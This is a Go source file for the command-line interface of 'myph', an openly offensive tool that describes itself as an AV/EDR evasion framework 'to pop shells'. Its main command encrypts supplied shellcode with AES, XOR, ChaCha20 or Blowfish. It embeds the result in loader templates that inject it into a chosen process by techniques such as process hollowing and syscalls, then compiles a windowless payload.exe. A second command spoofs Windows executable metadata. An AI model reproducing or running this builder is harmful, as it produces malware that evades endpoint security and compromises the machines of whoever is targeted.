package cli

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/cmepw/myph/loaders"
	"github.com/cmepw/myph/rc"
	"github.com/cmepw/myph/tools"
	"github.com/spf13/cobra"
	"github.com/tc-hib/winres"
)

const MYPH_TMP_DIR = "/tmp/myph-out"
const MYPH_TMP_WITH_PAYLOAD = "/tmp/myph-out/payload.exe"

const ASCII_ART = `
              ...                                        -==[ M Y P H ]==-
             ;::::;
           ;::::; :;                                    In loving memory of
         ;:::::'   :;                               Wassyl Iaroslavovytch Slipak
        ;:::::;     ;.
       ,:::::'       ;           OOO                       (1974 - 2016)
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;::::::::: . ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO        AV / EDR evasion framework
; :::::: '::::::;;;::::: ,#/  /          DOOO           to pop shells and
: ::::::: ;::::::;;::: ;::#  /            DOOO        make the blue team cry
:: ::::::: ;:::::::: ;::::# /              DOO
 : ::::::: ;:::::: ;::::::#/               DOO
 ::: ::::::: ;; ;:::::::::##                OO       written with <3 by djnn
 :::: ::::::: ;::::::::;:::#                OO                ------
 ::::: ::::::::::::;' :;::#                O             https://djnn.sh
   ::::: ::::::::;  /  /  :#
   :::::: :::::;   /  /    #


    `

func GetParser(opts *Options) *cobra.Command {

	version := "1.2.0"
	var spoofMetadata = &cobra.Command{
		Use:                "spoof",
		Version:            version,
		DisableSuggestions: true,
		Short:              "spoof PE metadata using versioninfo",
		Long:               ASCII_ART,
		Run: func(cmd *cobra.Command, args []string) {

			/* obligatory skid ascii art */
			fmt.Printf("%s\n\n", ASCII_ART)

			exe, err := os.Open(opts.PEFilePath)
			if err != nil {
				panic(err)
			}
			defer exe.Close()

			rs, err := winres.LoadFromEXE(exe)
			if err != nil {
				rs = &winres.ResourceSet{}
			}

			err = rc.LoadResourcesFromJson(rs, opts.VersionFilePath)
			if err != nil {
				panic(err)
			}

			fmt.Printf("[+] Successfully extracted PE metadata from JSON\n")

			tmpPath := "/tmp/" + filepath.Base(opts.PEFilePath) + ".tmp"
			out, err := os.Create(tmpPath)
			if err != nil {
				panic(err)
			}
			defer out.Close()

			err = rs.WriteToEXE(out, exe, winres.WithAuthenticode(winres.IgnoreSignature))
			if err != nil {
				panic(err)
			}

			fmt.Printf("[+] New metadata is set !\n")

			exe.Close()
			out.Close()

			os.Remove(opts.PEFilePath)
			tools.MoveFile(tmpPath, opts.PEFilePath)

			fmt.Printf("[+] Done !\n")
		},
	}

	var runLoader = &cobra.Command{
		Use:                "myph",
		Version:            version,
		DisableSuggestions: true,
		Short:              "AV/EDR evasion framework",
		Long:               ASCII_ART,
		Run: func(cmd *cobra.Command, args []string) {

			/* obligatory skid ascii art */
			fmt.Printf("%s\n\n", ASCII_ART)

			/* later, we will call "go build" on a golang project, so we need to set up the project tree */
			err := tools.CreateTmpProjectRoot(MYPH_TMP_DIR)
			if err != nil {
				fmt.Printf("[!] Error generating project root: %s\n", err)
				os.Exit(1)
			}

			/* reading the shellcode as a series of bytes */
			shellcode, err := tools.ReadFile(opts.ShellcodePath)
			if err != nil {
				fmt.Printf("[!] Error reading shellcode file: %s\n", err.Error())
				os.Exit(1)
			}

			/* i got 99 problems but generating a random key aint one */
			if opts.Key == "" {
				opts.Key = tools.RandomString(32)
			}

			fmt.Printf("[+] Selected algorithm: %s (Key: %s)\n", opts.Encryption.String(), opts.Key)

			/* encoding defines the way the series of bytes will be written into the template */
			encType := tools.SelectRandomEncodingType()

			fmt.Printf("\tEncoding into template with [%s]\n", encType.String())

			/*
			   depending on encryption type, we do the following:

			   - encrypt shellcode with key
			   - write both encrypted & key to file
			   - write to encrypt.go
			   - write to go.mod the required dependencies
			*/

			var encrypted = []byte{}
			var template = ""

			switch opts.Encryption {
			case EncKindAES:
				encrypted, err = tools.EncryptAES(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with AES")
					panic(err)
				}
				template = tools.GetAESTemplate()

			case EncKindXOR:
				encrypted, err = tools.EncryptXOR(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with XOR")
					panic(err)
				}
				template = tools.GetXORTemplate()

			case EncKindC20:
				encrypted, err = tools.EncryptChacha20(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with ChaCha20")
					panic(err)
				}

				/* Running `go get "golang.org/x/crypto/chacha20poly1305"` in MYPH_TMP_DIR` */
				execCmd := exec.Command("go", "get", "golang.org/x/crypto/chacha20poly1305")
				execCmd.Dir = MYPH_TMP_DIR

				_, _ = execCmd.Output()
				template = tools.GetChacha20Template()

			case EncKindBLF:
				encrypted, err = tools.EncryptBlowfish(shellcode, []byte(opts.Key))
				if err != nil {
					fmt.Println("[!] Could not encrypt with Blowfish")
					panic(err)
				}

				/* Running `go get golang.org/x/crypto/blowfish in MYPH_TMP_DIR` */
				execCmd := exec.Command("go", "get", "golang.org/x/crypto/blowfish")
				execCmd.Dir = MYPH_TMP_DIR

				_, _ = execCmd.Output()
				template = tools.GetBlowfishTemplate()
			}

			/* write decryption routine template */
			err = tools.WriteToFile(MYPH_TMP_DIR, "encrypt.go", template)
			if err != nil {
				panic(err)
			}

			/* write main execution template */
			encodedShellcode := tools.EncodeForInterpolation(encType, encrypted)
			encodedKey := tools.EncodeForInterpolation(encType, []byte(opts.Key))
			err = tools.WriteToFile(
				MYPH_TMP_DIR,
				"main.go",
				tools.GetMainTemplate(
					encType.String(),
					encodedKey,
					encodedShellcode,
					opts.SleepTime,
				),
			)
			if err != nil {
				panic(err)
			}

			os.Setenv("GOOS", opts.OS)
			os.Setenv("GOARCH", opts.Arch)

			templateFunc := loaders.SelectTemplate(opts.Technique)
			if templateFunc == nil {
				fmt.Printf("[!] Could not find a technique for this method: %s\n", opts.Technique)
				os.Exit(1)
			}

			err = tools.WriteToFile(MYPH_TMP_DIR, "exec.go", templateFunc(opts.Target))
			if err != nil {
				panic(err)
			}

			fmt.Printf("\n[+] Template (%s) written to tmp directory. Compiling...\n", opts.Technique)

			var stderr error
			if opts.WithDebug {
				fmt.Printf("\n[!] debug mode enabled\n")

				execCmd := exec.Command("go", "build", "-o", "payload.exe", ".")
				execCmd.Dir = MYPH_TMP_DIR
				_, stderr = execCmd.Output()

			} else {
				execCmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", "payload.exe", ".")
				execCmd.Dir = MYPH_TMP_DIR
				_, stderr = execCmd.Output()

			}

			if stderr != nil {
				fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
				fmt.Printf(
					"\nYou may try to run the following command in %s to find out what happend:\n\n GOOS=%s GOARCH=%s %s\n\n",
					MYPH_TMP_DIR,
					opts.OS,
					opts.Arch,
					"go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe",
				)

				fmt.Println("If you want to submit a bug report, please add the output from this command...Thank you <3")
				os.Exit(1)
			}

			tools.MoveFile(MYPH_TMP_WITH_PAYLOAD, opts.OutName)
			os.RemoveAll(MYPH_TMP_DIR)

			fmt.Printf("[+] Done! Compiled payload: %s\n", opts.OutName)
		},
	}

	defaults := GetDefaultCLIOptions()
	var rootCmd = runLoader

	rootCmd.AddCommand(spoofMetadata)

	rootCmd.Flags().StringVarP(&opts.OutName, "out", "f", defaults.OutName, "output name")
	rootCmd.Flags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
	rootCmd.Flags().StringVarP(&opts.Target, "process", "p", defaults.Target, "target process to inject shellcode to")
	rootCmd.Flags().StringVarP(&opts.Technique, "technique", "t", defaults.Technique, "shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, Syscall, Etwp)")
	rootCmd.Flags().VarP(&opts.Encryption, "encryption", "e", "encryption method. (allowed: AES, chacha20, XOR, blowfish)")
	rootCmd.Flags().StringVarP(&opts.Key, "key", "k", "", "encryption key, auto-generated if empty. (if used by --encryption)")
	rootCmd.Flags().UintVarP(&opts.SleepTime, "sleep-time", "", defaults.SleepTime, "sleep time in seconds before executing loader (default: 0)")
    rootCmd.Flags().BoolVarP(&opts.WithDebug, "debug", "d", false, "builds binary with debug symbols")

	spoofMetadata.Flags().StringVarP(&opts.PEFilePath, "pe", "p", defaults.PEFilePath, "PE file to spoof")
	spoofMetadata.Flags().StringVarP(&opts.VersionFilePath, "file", "f", defaults.VersionFilePath, "manifest file path (as JSON)")

	return rootCmd
}
